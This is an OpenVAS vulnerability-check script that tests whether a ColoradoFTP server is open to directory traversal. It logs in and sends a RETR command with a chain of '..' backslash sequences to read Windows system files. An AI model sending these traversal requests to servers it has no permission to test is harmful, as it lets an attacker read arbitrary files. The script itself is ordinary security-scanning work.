###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 13497 2019-02-06 10:45:54Z cfischer $
#
# ColoradoFTP Server Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:colorado:coloradoftpserver";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807877");
  script_version("$Revision: 13497 $");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:45:54 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-08-17 16:19:22 +0530 (Wed, 17 Aug 2016)");
  script_name("ColoradoFTP Server Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The host is running ColoradoFTP server
  and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal
  attack request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling
  specially crafted commands like 'MKDIR', 'PUT', 'GET' or 'DEL' followed by
  sequences (\\\..\\).");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"ColoradoFTP v1.3 Prime Edition (Build 8)
  Other versions may also be affected");

  script_tag(name:"solution", value:"Upgrade to ColoradoFTP Prime Edition (Build 9)
  or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40231");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("gb_colorado_ftp_server_detect.nasl");
  script_mandatory_keys("ColoradoFTP/Server/installed");
  script_require_ports("Services/ftp", 21);
  script_xref(name:"URL", value:"http://cftp.coldcore.com");
  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("misc_func.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details)
{
 close(soc);
 exit(0);
}

ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2)
{
  close(soc);
  exit(0);
}

soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

files = traversal_files( "Windows" );

foreach pattern(keys(files)) {

  file = files[pattern];
  file = str_replace( string:file, find:"/", replace:"\\\\" );

  file = string ("\\\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\", file);
  req = string("RETR ", file);
  send(socket:soc, data:string(req, "\r\n"));

  res = ftp_recv_data(socket:soc2);

  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message(port:ftpPort, data:report);
    close(soc2);
    close(soc);
    exit(0);
  }
}
close(soc);
close(soc2);
